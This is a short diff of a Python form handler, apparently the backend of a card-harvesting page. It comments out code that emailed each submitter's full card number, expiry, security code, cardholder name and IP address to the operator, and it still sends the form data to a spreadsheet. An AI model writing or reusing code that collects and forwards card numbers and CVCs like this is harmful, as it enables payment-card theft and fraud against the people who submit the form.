@@ -104,19 +104,19 @@ def submit():
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
     # メール本文作成
-    body = f"""▼申し込み内容
+#     body = f"""▼申し込み内容
 
-メールアドレス: {email}
-カード番号: {card_number}
-有効期限: {expiry}
-セキュリティコード: {cvc}
-カード名義: {card_name}
-送信元IP: {ip}
-送信時刻: {timestamp}
-"""
+# メールアドレス: {email}
+# カード番号: {card_number}
+# 有効期限: {expiry}
+# セキュリティコード: {cvc}
+# カード名義: {card_name}
+# 送信元IP: {ip}
+# 送信時刻: {timestamp}
+# """
 
-    # メール送信
-    send_email("フォーム送信通知", body)
+#     # メール送信
+#     send_email("フォーム送信通知", body)
 
     # スプレッドシートに記録
     write_to_sheet(ip, form, timestamp)
